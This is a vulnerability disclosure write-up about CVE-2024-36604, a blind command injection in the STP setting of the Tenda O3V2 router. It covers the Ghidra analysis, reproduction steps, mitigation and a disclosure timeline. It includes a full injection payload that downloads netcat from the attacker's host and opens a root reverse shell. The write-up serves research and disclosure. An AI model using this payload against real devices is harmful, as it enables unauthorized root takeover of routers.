---
title: CVE-2024-36604 - Blind Command Injection in STP Service on Tenda O3V2
date: 2024-05-20 13:30:00 +07:00
tags: [research, hardware]
---

This article discusses the second vulnerability I found in the Tenda O3V2 with firmware version 1.0.0.12. The vulnerability I found was blind command injection on the enable/disable STP Service feature. Blind command injection is a vulnerability that allows an attacker to execute operating system commands on the server that is running an application and application does not return the output from the command. Tenda O3V2 have stp service, by default this service is off, when disable this service will carry a value of 0 and if enable the service will carry a value of 1 on the parameter then enter the dosystemcmd function. Due to the lack of validation on these parameter, blind command injection can occur.


### Vulnerability Analysis

Open router’s httpd binary with Ghidra. In the setSTP function there is the doSystemCmd function, this function executes the command that will enable/disable the stp service and this function requires user input.  It is evident in the stprequest variable there is no sanitization, this variable will later be passed to the doSystemCmd function, potentially leading to command injection, and because the command is only executed and the result of the command is not displayed, this command injection is blind.

![SetSTP Function](/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/setstpfunc.png)

Listen on port 1337 with nc (netcat), then activate the web server to make the router download the netcat binary (mips). Netcat is used for reverse shell.

![Python HTTP Server](/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/pythonhttpserver.png)

Visit 192.168.2.1 and login, then go to Network Service

![Network Service](/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/networkservice.png)

Intercept request using burpsuite when submit. In the setNetworkService endpoint, there is stpEn parameter.

![Intercept Request](/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/interceptrequest.png)

Change the value of the stpEn parameter to the command we want, for example performing a reverse shell then forward the request<br>
```bash
;wget 192.168.2.158:8000/netcat -O /tmp/netcat&&chmod +x /tmp/netcat&&./tmp/netcat 192.168.2.158 1337 -e /bin/sh
```
Explanation of this command, the router will download the netcat binary stored in the tmp directory, then the binary will be given execute access and then execute the binary to reverse shell to port 1337. Then forward the request.

![Reverse Shell](/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/revshell.png)

Check the web server, and it's visible that the router is downloading the netcat file

![Download nc MIPS](/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/downloadncmips.png)

Check on the listener, the reverse shell is successful. Now, we got full access to the router with root privilege.

![Got Root Shell](/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/gotrootshell.png)


### Mitigation

When this article was published, Tenda had already released new firmware for this device with firmware version 1.0.0.13(5755). In this firmware version, the vulnerability has been fixed by implementing sanitization.

They still haven't released the new firmware to the public but you can download the latest firmware [here](https://drive.google.com/file/d/1687UGmpNgmPnvOeJtIuDvoEUrDh7VSKZ/view?usp=sharing){:target="_blank"}{:rel="noopener noreferrer"}


### Timeline
20 April 2024: Vulnerability discovered and sent them the details of the vulnerability.<br>
20 April 2024: Vendor triage the vulnerability.<br>
22 April 2024: Vendor release new firmware version 1.0.0.13(5755).<br>
25 April 2024: Retesting on the new firmware version and confirming the vulnerability has been fixed.<br>
4 June 2024: CVE ID assigned